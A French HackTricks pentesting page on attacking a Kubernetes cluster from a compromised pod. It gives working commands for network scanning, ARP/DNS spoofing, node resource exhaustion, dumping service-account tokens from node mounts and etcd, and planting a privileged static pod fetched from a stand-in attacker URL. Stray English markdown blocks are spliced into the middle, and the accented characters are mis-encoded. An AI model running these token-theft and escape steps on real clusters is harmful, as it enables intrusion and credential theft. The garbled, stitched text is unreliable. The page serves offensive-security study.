# Attaquer Kubernetes depuis l'int√©rieur d'une Pod

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert de l'√©quipe rouge HackTricks AWS)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## **√âvasion de la Pod**

**Si vous avez de la chance, vous pourriez r√©ussir √† vous √©chapper vers le n≈ìud :**

![](https://sickrov.github.io/media/Screenshot-161.jpg)

### √âvasion de la pod

Pour essayer de vous √©chapper des pods, vous pourriez avoir besoin de **d'abord escalader les privil√®ges**, voici quelques techniques pour le faire :

{% embed url="https://book.hacktricks.xyz/linux-hardening/privilege-escalation" %}

Vous pouvez v√©rifier ces **√©vasions de docker pour essayer de vous √©chapper** d'une pod que vous avez compromise :

{% embed url="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout" %}

### Abus des privil√®ges Kubernetes

Comme expliqu√© dans la section sur **l'√©num√©ration de Kubernetes** :

{% content-ref url="kubernetes-enumeration.md" %}
[kubernetes-enumeration.md](kubernetes-enumeration.md)
{% endcontent-ref %}

G√©n√©ralement, les pods sont ex√©cut√©s avec un **jeton de compte de service** √† l'int√©rieur d'eux. Ce compte de service peut avoir certains **privil√®ges attach√©s** que vous pourriez **abuser** pour **passer** √† d'autres pods ou m√™me pour **vous √©chapper** vers les n≈ìuds configur√©s √† l'int√©rieur du cluster. D√©couvrez comment faire dans :

{% content-ref url="abusing-roles-clusterroles-in-kubernetes/" %}
[abusing-roles-clusterroles-in-kubernetes](abusing-roles-clusterroles-in-kubernetes/)
{% endcontent-ref %}

### Abus des privil√®ges Cloud

Si la pod est ex√©cut√©e √† l'int√©rieur d'un **environnement cloud**, vous pourriez √™tre en mesure de **r√©cup√©rer un jeton depuis le point de terminaison des m√©tadonn√©es** et d'escalader les privil√®ges en l'utilisant.

## Recherche de services r√©seau vuln√©rables

√âtant donn√© que vous √™tes √† l'int√©rieur de l'environnement Kubernetes, si vous ne pouvez pas escalader les privil√®ges en abusant des privil√®ges actuels des pods et que vous ne pouvez pas vous √©chapper du conteneur, vous devriez **rechercher des services potentiellement vuln√©rables.**

### Services

**√Ä cette fin, vous pouvez essayer d'obtenir tous les services de l'environnement Kubernetes :**
```
kubectl get svc --all-namespaces
```
Par d√©faut, Kubernetes utilise un sch√©ma de r√©seau plat, ce qui signifie que **tout pod/service au sein du cluster peut communiquer avec les autres**. Les **espaces de noms** au sein du cluster **n'ont aucune restriction de s√©curit√© r√©seau par d√©faut**. Tout le monde dans l'espace de noms peut communiquer avec d'autres espaces de noms.

### Analyse

Le script Bash suivant (issu d'un [atelier Kubernetes](https://github.com/calinah/learn-by-hacking-kccn/blob/master/k8s\_cheatsheet.md)) installera et analysera les plages IP du cluster Kubernetes :
```bash
sudo apt-get update
sudo apt-get install nmap
nmap-kube ()
{
nmap --open -T4 -A -v -Pn -p 80,443,2379,8080,9090,9100,9093,4001,6782-6784,6443,8443,9099,10250,10255,10256 "${@}"
}

nmap-kube-discover () {
local LOCAL_RANGE=$(ip a | awk '/eth0$/{print $2}' | sed 's,[0-9][0-9]*/.*,*,');
local SERVER_RANGES=" ";
SERVER_RANGES+="10.0.0.1 ";
SERVER_RANGES+="10.0.1.* ";
SERVER_RANGES+="10.*.0-1.* ";
nmap-kube ${SERVER_RANGES} "${LOCAL_RANGE}"
}
nmap-kube-discover
```
Consultez la page suivante pour apprendre comment vous pourriez **attaquer des services sp√©cifiques de Kubernetes** pour **compromettre d'autres pods/tout l'environnement** :

{% content-ref url="pentesting-kubernetes-services/" %}
[pentesting-kubernetes-services](pentesting-kubernetes-services/)
{% endcontent-ref %}

### Sniffing

Dans le cas o√π le **pod compromis ex√©cute un service sensible** o√π d'autres pods doivent s'authentifier, vous pourriez √™tre en mesure d'obtenir les informations d'identification envoy√©es par les autres pods en **sniffant les communications locales**.

## Spoofing r√©seau

Par d√©faut, des techniques telles que le **spoofing ARP** (et gr√¢ce √† cela le **spoofing DNS**) fonctionnent dans le r√©seau Kubernetes. Ensuite, √† l'int√©rieur d'un pod, si vous avez la **capacit√© NET\_RAW** (qui est activ√©e par d√©faut), vous pourrez envoyer des paquets r√©seau personnalis√©s et effectuer des **attaques de l'homme du milieu via le spoofing ARP sur tous les pods s'ex√©cutant sur le m√™me n≈ìud**.\
De plus, si le **pod malveillant** s'ex√©cute sur le **m√™me n≈ìud que le serveur DNS**, vous pourrez effectuer une **attaque de spoofing DNS sur tous les pods du cluster**.

{% content-ref url="kubernetes-network-attacks.md" %}
[kubernetes-network-attacks.md](kubernetes-network-attacks.md)
{% endcontent-ref %}

## Node DoS

Il n'y a pas de sp√©cification de ressources dans les manifestes Kubernetes et **aucune limite appliqu√©e** pour les conteneurs. En tant qu'attaquant, nous pouvons **consommer toutes les ressources o√π s'ex√©cute le pod/d√©ploiement** et priver d'autres ressources, provoquant ainsi un DoS pour l'environnement.

Cela peut √™tre fait avec un outil tel que [**stress-ng**](https://zoomadmin.com/HowToInstall/UbuntuPackage/stress-ng):
```
stress-ng --vm 2 --vm-bytes 2G --timeout 30s
```
Vous pouvez voir la diff√©rence pendant l'ex√©cution de `stress-ng` et apr√®s
```bash
kubectl --namespace big-monolith top pod hunger-check-deployment-xxxxxxxxxx-xxxxx
```
## Post-Exploitation du N≈ìud

Si vous avez r√©ussi √† **√©chapper au conteneur**, vous trouverez des choses int√©ressantes dans le n≈ìud :

- Le processus **Container Runtime** (Docker)
- Plus de **pods/conteneurs** s'ex√©cutant dans le n≈ìud que vous pouvez exploiter comme celui-ci (plus de jetons)
- Tout le **syst√®me de fichiers** et le **syst√®me d'exploitation** en g√©n√©ral
- Le service **Kube-Proxy** en √©coute
- Le service **Kubelet** en √©coute. V√©rifiez les fichiers de configuration :
  - R√©pertoire : `/var/lib/kubelet/`
  - `/var/lib/kubelet/kubeconfig`
  - `/var/lib/kubelet/kubelet.conf`
  - `/var/lib/kubelet/config.yaml`
  - `/var/lib/kubelet/kubeadm-flags.env`
  - `/etc/kubernetes/kubelet-kubeconfig`
- Autres **fichiers kubernetes courants** :
  - `$HOME/.kube/config` - **Configuration utilisateur**
  - `/etc/kubernetes/kubelet.conf`- **Configuration r√©guli√®re**
  - `/etc/kubernetes/bootstrap-kubelet.conf` - **Configuration de d√©marrage**
  - `/etc/kubernetes/manifests/etcd.yaml` - **Configuration etcd**
  - `/etc/kubernetes/pki` - **Cl√© Kubernetes**

### Trouver le kubeconfig du n≈ìud

Si vous ne parvenez pas √† trouver le fichier kubeconfig dans l'un des chemins pr√©c√©demment comment√©s, **v√©rifiez l'argument `--kubeconfig` du processus kubelet** :
```
ps -ef | grep kubelet
root        1406       1  9 11:55 ?        00:34:57 kubelet --cloud-provider=aws --cni-bin-dir=/opt/cni/bin --cni-conf-dir=/etc/cni/net.d --config=/etc/kubernetes/kubelet-conf.json --exit-on-lock-contention --kubeconfig=/etc/kubernetes/kubelet-kubeconfig --lock-file=/var/run/lock/kubelet.lock --network-plugin=cni --container-runtime docker --node-labels=node.kubernetes.io/role=k8sworker --volume-plugin-dir=/var/lib/kubelet/volumeplugin --node-ip 10.1.1.1 --hostname-override ip-1-1-1-1.eu-west-2.compute.internal
```
### Voler des secrets
```bash
# Check Kubelet privileges
kubectl --kubeconfig /var/lib/kubelet/kubeconfig auth can-i create pod -n kube-system

# Steal the tokens from the pods running in the node
# The most interesting one is probably the one of kube-system
ALREADY="IinItialVaaluE"
for i in $(mount | sed -n '/secret/ s/^tmpfs on \(.*default.*\) type tmpfs.*$/\1\/namespace/p'); do
TOKEN=$(cat $(echo $i | sed 's/.namespace$/\/token/'))
if ! [ $(echo $TOKEN | grep -E $ALREADY) ]; then
ALREADY="$ALREADY|$TOKEN"
echo "Directory: $i"
echo "Namespace: $(cat $i)"
echo ""
echo $TOKEN
echo "================================================================================"
echo ""
fi
done
```
Le script [**can-they.sh**](https://github.com/BishopFox/badPods/blob/main/scripts/can-they.sh) va automatiquement **obtenir les jetons d'autres pods et v√©rifier s'ils ont la permission** que vous recherchez (au lieu que vous les cherchiez un par un) :
```bash
./can-they.sh -i "--list -n default"
./can-they.sh -i "list secrets -n kube-system"// Some code
```
### DaemonSets Privil√©gi√©s

Un DaemonSet est un **pod** qui sera **ex√©cut√©** sur **tous les n≈ìuds du cluster**. Par cons√©quent, si un DaemonSet est configur√© avec un **compte de service privil√©gi√©**, dans **TOUS les n≈ìuds**, vous pourrez trouver le **jeton** de ce **compte de service privil√©gi√©** que vous pourriez exploiter.

L'exploit est le m√™me que dans la section pr√©c√©dente, mais maintenant vous ne d√©pendez plus de la chance.

### Pivot vers le Cloud

Si le cluster est g√©r√© par un service cloud, g√©n√©ralement le **N≈ìud aura un acc√®s diff√©rent au point de terminaison des m√©tadonn√©es** que le Pod. Par cons√©quent, essayez d'**acc√©der au point de terminaison des m√©tadonn√©es depuis le n≈ìud** (ou depuis un pod avec hostNetwork √† True):

{% content-ref url="kubernetes-pivoting-to-clouds.md" %}
[kubernetes-pivoting-to-clouds.md](kubernetes-pivoting-to-clouds.md)
{% endcontent-ref %}

### Voler etcd

Si vous pouvez sp√©cifier le [**nom du n≈ìud**](https://kubernetes.io/docs/tasks/configure-pod-container/assign-pods-nodes/#create-a-pod-that-gets-scheduled-to-specific-node) du N≈ìud qui ex√©cutera le conteneur, obtenez un shell √† l'int√©rieur d'un n≈ìud du plan de contr√¥le et obtenez la base de donn√©es **etcd**:
```
kubectl get nodes
NAME                STATUS   ROLES    AGE   VERSION
k8s-control-plane   Ready    master   93d   v1.19.1
k8s-worker          Ready    <none>   93d   v1.19.1
```
Les n≈ìuds de plan de contr√¥le ont le **r√¥le ma√Ætre** et dans les **clusters g√©r√©s dans le cloud, vous ne pourrez pas ex√©cuter quoi que ce soit sur eux**.

#### Lire les secrets depuis etcd

Si vous pouvez ex√©cuter votre pod sur un n≈ìud de plan de contr√¥le en utilisant le s√©lecteur `nodeName` dans la sp√©cification du pod, vous pourriez avoir un acc√®s facile √† la base de donn√©es `etcd`, qui contient toute la configuration du cluster, y compris tous les secrets.

Voici une m√©thode rapide et peu orthodoxe pour r√©cup√©rer des secrets depuis `etcd` s'il est en cours d'ex√©cution sur le n≈ìud de plan de contr√¥le sur lequel vous vous trouvez. Si vous souhaitez une solution plus √©l√©gante qui lance un pod avec l'utilitaire client `etcd` `etcdctl` et utilise les informations d'identification du n≈ìud de plan de contr√¥le pour se connecter √† etcd o√π qu'il soit en cours d'ex√©cution, consultez [cet exemple de manifeste](https://github.com/mauilion/blackhat-2019/blob/master/etcd-attack/etcdclient.yaml) de @mauilion.

**V√©rifiez si `etcd` est en cours d'ex√©cution sur le n≈ìud de plan de contr√¥le et voyez o√π se trouve la base de donn√©es (Ceci est sur un cluster cr√©√© avec `kubeadm`)**
```
root@k8s-control-plane:/var/lib/etcd/member/wal# ps -ef | grep etcd | sed s/\-\-/\\n/g | grep data-dir
```
```markdown
## Attacking Kubernetes from Inside a Pod

### Introduction

When an attacker gains access to a Kubernetes pod, they are in a privileged position to perform further attacks within the cluster. This section will cover various techniques that an attacker can use to escalate privileges and move laterally within the Kubernetes cluster.

### Escalating Privileges

#### Accessing the Kubernetes API

One common technique is to access the Kubernetes API from within a compromised pod. This can be achieved by mounting the `/var/run/secrets/kubernetes.io/serviceaccount` directory, which contains the necessary credentials to authenticate with the API server.

#### Exploiting Service Accounts

Service accounts are used by pods to authenticate with the Kubernetes API. If an attacker gains access to a pod with elevated privileges, they can abuse the associated service account to perform malicious actions within the cluster.

### Moving Laterally

#### Pod Hopping

Once inside a compromised pod, an attacker can move laterally by hopping from one pod to another within the same node or across different nodes in the cluster. This can help the attacker gain access to sensitive data or perform further attacks.

#### Exploiting Misconfigurations

Attackers can also exploit misconfigurations in the Kubernetes cluster to move laterally. For example, if a pod has overly permissive RBAC roles or misconfigured network policies, an attacker can leverage these weaknesses to escalate privileges and access other pods within the cluster.

### Conclusion

Gaining access to a Kubernetes pod can be a stepping stone for attackers to escalate privileges and move laterally within the cluster. It is crucial for organizations to secure their Kubernetes clusters and regularly audit for any vulnerabilities that could be exploited by attackers.
```
```bash
data-dir=/var/lib/etcd
```
**Voir les donn√©es dans la base de donn√©es etcd :**
```bash
strings /var/lib/etcd/member/snap/db | less
```
**Extraire les jetons de la base de donn√©es et afficher le nom du compte de service**
```bash
db=`strings /var/lib/etcd/member/snap/db`; for x in `echo "$db" | grep eyJhbGciOiJ`; do name=`echo "$db" | grep $x -B40 | grep registry`; echo $name \| $x; echo; done
```
**M√™me commande, mais avec quelques greps pour ne renvoyer que le jeton par d√©faut dans l'espace de noms kube-system**
```bash
db=`strings /var/lib/etcd/member/snap/db`; for x in `echo "$db" | grep eyJhbGciOiJ`; do name=`echo "$db" | grep $x -B40 | grep registry`; echo $name \| $x; echo; done | grep kube-system | grep default
```
```markdown
## Attacking Kubernetes from Inside a Pod

When an attacker gains access to a Kubernetes pod, they are in a privileged position to perform further attacks within the cluster. Here are some techniques attackers can use from inside a pod:

### 1. Accessing the Kubernetes API Server

Attackers can access the Kubernetes API server from inside a compromised pod. This can allow them to gather sensitive information, modify resources, or launch further attacks on the cluster.

### 2. Exploiting Service Account Tokens

Service account tokens are used by pods to authenticate with the Kubernetes API server. If an attacker gains access to a pod's service account token, they can impersonate the pod and perform malicious actions within the cluster.

### 3. Mounting Host Paths

Attackers can mount host paths from inside a pod, allowing them to access sensitive data or modify host resources. This can lead to privilege escalation or further compromise of the cluster.

### 4. Exploiting Insecure Configurations

Insecure configurations within a pod, such as exposed credentials or misconfigured permissions, can be exploited by attackers to gain further access to the cluster. It is important to regularly audit and secure pod configurations to prevent such attacks.

By understanding these techniques, security professionals can better defend Kubernetes clusters against attacks from within compromised pods.
```
```
1/registry/secrets/kube-system/default-token-d82kb | eyJhbGciOiJSUzI1NiIsImtpZCI6IkplRTc0X2ZP[REDACTED]
```
### Persistance des Pods Statiques/Miroirs

Les _Pods Statiques_ sont g√©r√©s directement par le d√©mon kubelet sur un n≈ìud sp√©cifique, sans que le serveur API les observe. Contrairement aux Pods g√©r√©s par le plan de contr√¥le (par exemple, un D√©ploiement); au lieu de cela, le **kubelet surveille chaque Pod statique** (et le red√©marre s'il √©choue).

Par cons√©quent, les Pods statiques sont toujours **li√©s √† un seul Kubelet** sur un n≈ìud sp√©cifique.

Le **kubelet essaie automatiquement de cr√©er un Pod miroir sur le serveur API Kubernetes** pour chaque Pod statique. Cela signifie que les Pods s'ex√©cutant sur un n≈ìud sont visibles sur le serveur API, mais ne peuvent pas √™tre contr√¥l√©s √† partir de l√†. Les noms des Pods seront suffix√©s avec le nom d'h√¥te du n≈ìud avec un tiret initial.

{% hint style="danger" %}
Le **`spec` d'un Pod statique ne peut pas faire r√©f√©rence √† d'autres objets API** (par exemple, ServiceAccount, ConfigMap, Secret, etc. Ainsi, **vous ne pouvez pas abuser de ce comportement pour lancer un pod avec un ServiceAccount arbitraire** dans le n≈ìud actuel pour compromettre le cluster. Mais vous pourriez utiliser cela pour ex√©cuter des pods dans diff√©rents espaces de noms (si cela est utile pour une raison quelconque).
{% endhint %}

Si vous √™tes √† l'int√©rieur de l'h√¥te du n≈ìud, vous pouvez le faire cr√©er un **pod statique √† l'int√©rieur de lui-m√™me**. Cela est assez utile car cela pourrait vous permettre de **cr√©er un pod dans un espace de noms diff√©rent** comme **kube-system**.

Pour cr√©er un pod statique, les [**docs sont d'une grande aide**](https://kubernetes.io/docs/tasks/configure-pod-container/static-pod/). Vous avez essentiellement besoin de 2 choses :

* Configurer le param√®tre **`--pod-manifest-path=/etc/kubernetes/manifests`** dans le **service kubelet**, ou dans la **configuration kubelet** ([**staticPodPath**](https://kubernetes.io/docs/reference/config-api/kubelet-config.v1beta1/#kubelet-config-k8s-io-v1beta1-KubeletConfiguration)) et red√©marrer le service
* Cr√©er la d√©finition sur la **d√©finition du pod** dans **`/etc/kubernetes/manifests`**

**Une autre fa√ßon plus furtive serait de :**

* Modifier le param√®tre **`staticPodURL`** du fichier de configuration de **kubelet** et d√©finir quelque chose comme `staticPodURL: http://attacker.com:8765/pod.yaml`. Cela fera en sorte que le processus kubelet cr√©e un **pod statique** en obtenant la **configuration √† partir de l'URL indiqu√©e**.

**Exemple** de **configuration de pod** pour cr√©er un pod privil√©gi√© dans **kube-system** tir√© de [**ici**](https://research.nccgroup.com/2020/02/12/command-and-kubectl-talk-follow-up/):
```yaml
apiVersion: v1
kind: Pod
metadata:
name: bad-priv2
namespace: kube-system
spec:
containers:
- name: bad
hostPID: true
image: gcr.io/shmoocon-talk-hacking/brick
stdin: true
tty: true
imagePullPolicy: IfNotPresent
volumeMounts:
- mountPath: /chroot
name: host
securityContext:
privileged: true
volumes:
- name: host
hostPath:
path: /
type: Directory
```
### Supprimer des pods + n≈ìuds non planifiables

Si un attaquant a **compromis un n≈ìud** et peut **supprimer des pods** d'autres n≈ìuds et **rendre d'autres n≈ìuds incapables d'ex√©cuter des pods**, les pods seront relanc√©s dans le n≈ìud compromis et il pourra **voler les jetons** ex√©cut√©s en eux.\
Pour [**plus d'informations, suivez ces liens**](abusing-roles-clusterroles-in-kubernetes/#delete-pods-+-unschedulable-nodes).

## Outils Automatiques

* [**https://github.com/inguardians/peirates**](https://github.com/inguardians/peirates)
```
Peirates v1.1.8-beta by InGuardians
https://www.inguardians.com/peirates
----------------------------------------------------------------
[+] Service Account Loaded: Pod ns::dashboard-56755cd6c9-n8zt9
[+] Certificate Authority Certificate: true
[+] Kubernetes API Server: https://10.116.0.1:443
[+] Current hostname/pod name: dashboard-56755cd6c9-n8zt9
[+] Current namespace: prd
----------------------------------------------------------------
Namespaces, Service Accounts and Roles |
---------------------------------------+
[1] List, maintain, or switch service account contexts [sa-menu]  (try: listsa *, switchsa)
[2] List and/or change namespaces [ns-menu] (try: listns, switchns)
[3] Get list of pods in current namespace [list-pods]
[4] Get complete info on all pods (json) [dump-pod-info]
[5] Check all pods for volume mounts [find-volume-mounts]
[6] Enter AWS IAM credentials manually [enter-aws-credentials]
[7] Attempt to Assume a Different AWS Role [aws-assume-role]
[8] Deactivate assumed AWS role [aws-empty-assumed-role]
[9] Switch authentication contexts: certificate-based authentication (kubelet, kubeproxy, manually-entered) [cert-menu]
-------------------------+
Steal Service Accounts   |
-------------------------+
[10] List secrets in this namespace from API server [list-secrets]
[11] Get a service account token from a secret [secret-to-sa]
[12] Request IAM credentials from AWS Metadata API [get-aws-token] *
[13] Request IAM credentials from GCP Metadata API [get-gcp-token] *
[14] Request kube-env from GCP Metadata API [attack-kube-env-gcp]
[15] Pull Kubernetes service account tokens from kops' GCS bucket (Google Cloudonly) [attack-kops-gcs-1]  *
[16] Pull Kubernetes service account tokens from kops' S3 bucket (AWS only) [attack-kops-aws-1]
--------------------------------+
Interrogate/Abuse Cloud API's   |
--------------------------------+
[17] List AWS S3 Buckets accessible (Make sure to get credentials via get-aws-token or enter manually) [aws-s3-ls]
[18] List contents of an AWS S3 Bucket (Make sure to get credentials via get-aws-token or enter manually) [aws-s3-ls-objects]
-----------+
Compromise |
-----------+
[20] Gain a reverse rootshell on a node by launching a hostPath-mounting pod [attack-pod-hostpath-mount]
[21] Run command in one or all pods in this namespace via the API Server [exec-via-api]
[22] Run a token-dumping command in all pods via Kubelets (authorization permitting) [exec-via-kubelet]
-------------+
Node Attacks |
-------------+
[30] Steal secrets from the node filesystem [nodefs-steal-secrets]
-----------------+
Off-Menu         +
-----------------+
[90] Run a kubectl command using the current authorization context [kubectl [arguments]]
[] Run a kubectl command using EVERY authorization context until one works [kubectl-try-all [arguments]]
[91] Make an HTTP request (GET or POST) to a user-specified URL [curl]
[92] Deactivate "auth can-i" checking before attempting actions [set-auth-can-i]
[93] Run a simple all-ports TCP port scan against an IP address [tcpscan]
[94] Enumerate services via DNS [enumerate-dns] *
[]  Run a shell command [shell <command and arguments>]

[exit] Exit Peirates
```
* [**https://github.com/r0binak/MTKPI**](https://github.com/r0binak/MTKPI)

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert de l'√©quipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>

D'autres fa√ßons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts github.

</details>
